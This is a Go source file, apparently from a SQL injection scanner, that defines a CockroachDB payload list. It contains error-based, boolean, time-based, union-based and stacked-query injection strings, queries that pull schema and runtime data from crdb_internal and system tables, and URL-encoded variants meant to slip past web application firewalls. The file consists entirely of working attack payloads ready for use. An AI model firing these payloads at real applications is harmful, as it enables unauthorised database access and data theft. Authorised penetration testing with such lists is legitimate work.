package payloads

var CockroachDB = PayloadGroup{
	DBMS: "CockroachDB",
	Payloads: []Payload{
		// ═══════════════════════════════════════════
		// ERROR-BASED (PostgreSQL-compatible errors)
		// ═══════════════════════════════════════════
		{Type: "error", Content: "' AND 1=CAST(version() AS INT)--"},
		{Type: "error", Content: "' AND 1=CAST(current_database() AS INT)--"},
		{Type: "error", Content: "' AND 1=CAST(current_user() AS INT)--"},
		{Type: "error", Content: "' AND 1=CAST((SELECT database_name FROM crdb_internal.tables LIMIT 1) AS INT)--"},
		{Type: "error", Content: "' AND 1=CAST((SELECT table_name FROM crdb_internal.tables LIMIT 1) AS INT)--"},
		{Type: "error", Content: "' AND 1=CAST((SELECT column_name FROM information_schema.columns LIMIT 1) AS INT)--"},
		{Type: "error", Content: "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e,(SELECT database_name FROM crdb_internal.tables LIMIT 1),0x7e,FLOOR(RAND(0)*2))x FROM crdb_internal.tables GROUP BY x)a)--"},

		// ═══════════════════════════════════════════
		// BOOLEAN-BASED
		// ═══════════════════════════════════════════
		{Type: "boolean", Content: "' AND 1=1--", Expected: "true"},
		{Type: "boolean", Content: "' AND 1=2--", Expected: "false"},
		{Type: "boolean", Content: "' AND (SELECT 1)=(SELECT 1)--", Expected: "true"},
		{Type: "boolean", Content: "' AND (SELECT 1)=(SELECT 2)--", Expected: "false"},
		{Type: "boolean", Content: "' AND (SELECT database_name FROM crdb_internal.tables LIMIT 1) IS NOT NULL--", Expected: "true"},
		{Type: "boolean", Content: "' AND (SELECT 1 FROM pg_database LIMIT 1)=1--", Expected: "true"},

		// ═══════════════════════════════════════════
		// TIME-BASED (pg_sleep)
		// ═══════════════════════════════════════════
		{Type: "time", Content: "'; SELECT pg_sleep(5)--"},
		{Type: "time", Content: "' AND pg_sleep(5)--"},
		{Type: "time", Content: "' AND (SELECT pg_sleep(5))--"},
		{Type: "time", Content: "') AND pg_sleep(5)--"},
		{Type: "time", Content: "' UNION SELECT pg_sleep(5)--"},
		{Type: "time", Content: "'; SELECT pg_sleep(10)--"},
		{Type: "time", Content: "' OR pg_sleep(5)='"},

		// ═══════════════════════════════════════════
		// UNION-BASED
		// ═══════════════════════════════════════════
		{Type: "union", Content: "' UNION SELECT NULL--"},
		{Type: "union", Content: "' UNION SELECT NULL,NULL--"},
		{Type: "union", Content: "' UNION SELECT NULL,NULL,NULL--"},
		{Type: "union", Content: "' UNION SELECT NULL,NULL,NULL,NULL--"},
		{Type: "union", Content: "' UNION SELECT NULL,NULL,NULL,NULL,NULL--"},
		{Type: "union", Content: "') UNION SELECT NULL,NULL,NULL--"},
		{Type: "union", Content: "') UNION SELECT NULL,NULL,NULL,NULL--"},

		// ═══════════════════════════════════════════
		// DATA EXTRACTION (CockroachDB system tables)
		// ═══════════════════════════════════════════
		{Type: "deep", Content: "' UNION SELECT database_name FROM crdb_internal.tables LIMIT 1--"},
		{Type: "deep", Content: "' UNION SELECT table_name||':'||column_name FROM crdb_internal.columns LIMIT 50--"},
		{Type: "deep", Content: "' UNION SELECT name FROM system.namespace WHERE parentID=0--"},
		{Type: "deep", Content: "' UNION SELECT value FROM crdb_internal.node_runtime_info--"},
		{Type: "deep", Content: "' UNION SELECT version()--"},
		{Type: "deep", Content: "' UNION SELECT current_database()--"},
		{Type: "deep", Content: "' UNION SELECT current_user()--"},

		// ═══════════════════════════════════════════
		// STACKED QUERIES
		// ═══════════════════════════════════════════
		{Type: "stacked", Content: "'; SELECT 1;"},
		{Type: "stacked", Content: "'; CREATE TABLE t1 (c1 INT);--"},  // CockroachDB DDL in txns

		// ═══════════════════════════════════════════
		// WAF BYPASS
		// ═══════════════════════════════════════════
		{Type: "bypass", Content: "'/**/UNION/**/SELECT/**/NULL--"},
		{Type: "bypass", Content: "1'%09AND%09'1'%09LIKE%09'1"},
		{Type: "bypass", Content: "'%0AAND%0A1%3D1--"},
		{Type: "bypass", Content: "'%0AOR%0A1%3D1--"},
		{Type: "bypass", Content: "'%0AUNION%0ASELECT%0ANULL--"},
		{Type: "bypass", Content: "'%09UNION%09SELECT%09NULL--"},
		{Type: "bypass", Content: "'%2F**%2FAND%2F**%2F1%3D1--"},
		{Type: "time", Content: "1' AND pg_sleep(5)--"},
		{Type: "time", Content: "' AND pg_sleep(8)--"},
		{Type: "time", Content: "1' AND pg_sleep(10)--"},
		{Type: "time", Content: "' OR pg_sleep(5)--"},
		{Type: "time", Content: "1') AND pg_sleep(5)--"},
		{Type: "union", Content: "' UNION SELECT 1--"},
		{Type: "union", Content: "' UNION SELECT 1,2--"},
		{Type: "union", Content: "' UNION SELECT 1,2,3--"},
		{Type: "union", Content: "' UNION SELECT 1,2,3,4--"},
		{Type: "union", Content: "' UNION SELECT 1,2,3,4,5--"},
		{Type: "union", Content: "\" UNION SELECT 1,2,3--"},
		{Type: "union", Content: "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL--"},
		{Type: "union", Content: "') UNION SELECT 1,2,3,4,5--"},
		{Type: "boolean", Content: "\" AND 1=1--", Expected: "true"},
		{Type: "boolean", Content: "\" AND 1=2--", Expected: "false"},
		{Type: "boolean", Content: "') AND 1=1--", Expected: "true"},
		{Type: "boolean", Content: "') AND 1=2--", Expected: "false"},
		{Type: "boolean", Content: "' OR 1=1--", Expected: "true"},
		{Type: "boolean", Content: "' OR 1=2--", Expected: "false"},
		{Type: "boolean", Content: "' AND '1'='1'--", Expected: "true"},
		{Type: "boolean", Content: "' AND '1'='2'--", Expected: "false"},
		{Type: "error", Content: "' AND 1=CAST((SELECT name FROM system.namespace LIMIT 1) AS INT)--"},
		{Type: "error", Content: "' AND 1=CAST((SELECT value FROM crdb_internal.node_runtime_info LIMIT 1) AS INT)--"},
		{Type: "error", Content: "' AND 1=CAST((SELECT table_schema||'.'||table_name FROM information_schema.tables LIMIT 1) AS INT)--"},
		{Type: "deep", Content: "' UNION SELECT database_name||'.'||table_name||'.'||column_name FROM crdb_internal.columns ORDER BY 1--"},
		{Type: "deep", Content: "' UNION SELECT database_name FROM crdb_internal.tables WHERE database_name NOT LIKE 'crdb%'--"},
		{Type: "deep", Content: "' UNION SELECT name FROM system.namespace ORDER BY 1--"},
		{Type: "deep", Content: "' UNION SELECT table_name||':'||column_name||':'||data_type FROM information_schema.columns WHERE table_schema='public'--"},
		{Type: "deep", Content: "' UNION SELECT current_schema()--"},
		{Type: "stacked", Content: "'; SHOW TABLES;--"},
		{Type: "stacked", Content: "'; SHOW DATABASES;--"},
		{Type: "stacked", Content: "'; SHOW SCHEMAS;--"},
	},
}

